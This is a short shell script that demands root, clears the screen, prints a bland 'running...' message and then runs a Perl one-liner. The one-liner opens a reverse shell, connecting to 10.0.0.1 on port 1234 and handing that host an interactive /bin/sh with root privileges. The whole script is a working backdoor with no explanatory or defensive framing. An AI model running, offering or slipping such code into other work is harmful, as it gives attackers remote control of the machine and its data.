#!/bin/sh

checkroot() {
    SAVE_LD_PRELOAD="$LD_PRELOAD"
    unset LD_PRELOAD
    if [ "$(id -u)" -ne 0 ]; then
        printf "\e[1;31mPlease, run as root!\n\e[0m"
        exit 1
     fi
     LD_PRELOAD="$SAVE_LD_PRELOAD"
}

checkroot

clear;

if

printf "\nrunning..."

then

perl -e 'use Socket; $IP = "10.0.0.1"; $PORT = 1234; socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S, sockaddr_in($PORT, inet_aton($IP)))){open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S"); exec("/bin/sh -i");};'

else

	exit 1;
	return 0;

fi;
